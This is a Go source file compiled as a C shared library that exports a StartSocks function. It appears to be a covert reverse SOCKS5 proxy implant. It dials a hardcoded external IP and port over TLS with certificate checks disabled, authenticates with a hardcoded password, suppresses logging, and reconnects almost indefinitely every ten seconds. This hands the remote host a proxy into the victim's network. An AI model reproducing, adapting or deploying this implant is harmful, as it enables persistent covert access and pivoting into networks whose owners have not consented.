package main

import "C"
import (
	"crypto/tls"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"os"

	"strconv"
	"time"

	"encoding/base64"
	"encoding/json"

	socks5 "github.com/armon/go-socks5"
	"github.com/hashicorp/yamux"
)

var agentpassword string
var socksdebug bool

var encBase64 = base64.StdEncoding.EncodeToString
var decBase64 = base64.StdEncoding.DecodeString
var proxytimeout = time.Millisecond * 1000 //timeout for proxyserver response

type Client struct {
	Password string
}

func connectForSocks(tlsenable bool, address string, jclientinfo []byte) error {

	var session *yamux.Session
	server, err := socks5.New(&socks5.Config{})
	if err != nil {
		return err
	}

	conf := &tls.Config{
		InsecureSkipVerify: true,
	}

	var conn net.Conn
	// var connp net.Conn
	// var newconn net.Conn
	//var conntls tls.Conn
	//var conn tls.Conn

	log.Println("Connecting to far end")
	if tlsenable {
		conn, err = tls.Dial("tcp", address, conf)
	} else {
		conn, err = net.Dial("tcp", address)
	}
	if err != nil {
		return err
	}

	log.Println("Starting client")

	// conn.Write([]byte(agentpassword))
	conn.Write(jclientinfo)
	//time.Sleep(time.Second * 1)
	session, err = yamux.Server(conn, nil)

	if err != nil {
		return err
	}

	for {
		stream, err := session.Accept()
		log.Println("Accepting stream")
		if err != nil {
			return err
		}
		log.Println("Passing off to socks5")
		go func() {
			err = server.ServeConn(stream)
			if err != nil {
				log.Println(err)
			}
		}()
	}
}

func main() {
	// Need a main function to make CGO compile package as C shared library
}

//export StartSocks
func StartSocks(host string, port string) {
	fmt.Println(host)
	fmt.Println(port)

	// connect := flag.String("connect", "", "connect address:port")
	optproxytimeout := flag.String("proxytimeout", "", "proxy response timeout (ms)")
	// optpassword := flag.String("pass", "", "Connect password")
	// recn := flag.Int("recn", 3, "reconnection limit")
	// rect := flag.Int("rect", 30, "reconnection delay")
	fsocksdebug := flag.Bool("debug", false, "display debug info")
	optverbose := flag.Bool("v", false, "verbose")

	flag.Parse()
	if !*optverbose {
		log.SetOutput(ioutil.Discard)
	}

	if *fsocksdebug {
		socksdebug = true
	}

	//hardcoded creds
	recn := 99999999
	rect := 10

	connect := "45.152.85.15:18443"
	optpassword := "EQI2oHFfJFYCjoLF"

	// if *connect != "" {

	var ClientInfo Client
	ClientInfo.Password = optpassword

	jclientinfo, err := json.Marshal(ClientInfo)
	if err != nil {
		fmt.Println(err)
	}
	log.Println(string(jclientinfo))

	if *optproxytimeout != "" {
		opttimeout, _ := strconv.Atoi(*optproxytimeout)
		proxytimeout = time.Millisecond * time.Duration(opttimeout)
	} else {
		proxytimeout = time.Millisecond * 1000
	}

	if optpassword != "" {
		agentpassword = optpassword
	} else {
		agentpassword = "RocksDefaultRequestRocksDefaultRequestRocksDefaultRequestRocks!!"
	}

	//log.Fatal(connectForSocks(*connect))
	if recn > 0 {
		for i := 1; i <= recn; i++ {
			log.Printf("Connecting to the far end. Try %d of %d", i, recn)
			error1 := connectForSocks(true, connect, jclientinfo)
			log.Print(error1)
			log.Printf("Sleeping for %d sec...", rect)
			tsleep := time.Second * time.Duration(rect)
			time.Sleep(tsleep)
		}

	} else {
		for {
			log.Printf("Reconnecting to the far end... ")
			error1 := connectForSocks(true, connect, jclientinfo)
			log.Print(error1)
			log.Printf("Sleeping for %d sec...", rect)
			tsleep := time.Second * time.Duration(rect)
			time.Sleep(tsleep)
		}
	}

	log.Fatal("Ending...")
	// }

	flag.Usage()
	fmt.Fprintf(os.Stderr, "You must specify a listen port or a connect address\n")
	os.Exit(1)
}
